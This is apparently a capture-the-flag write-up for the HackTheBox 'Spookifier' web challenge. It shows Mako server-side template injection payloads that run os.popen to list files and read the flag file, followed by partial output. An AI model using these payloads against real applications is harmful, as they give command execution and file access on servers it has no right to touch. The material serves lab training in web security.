# Spookifier

Description:
```
There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?
```

Looking at the source code we can see mako is used. So we can try an SSTI payload.
```python
<%import os%>${os.popen('ls ').read()}
```

```bash
application run.py
```

And it works. We can see in the challenge folder the flag should be in the parent directory.
```python
<%import os%>${os.popen('cat ../flag.txt').read()}
```

Output:
```
HTB{t3mpl4t3_1nj3ct10n_C4n_3x1...
```
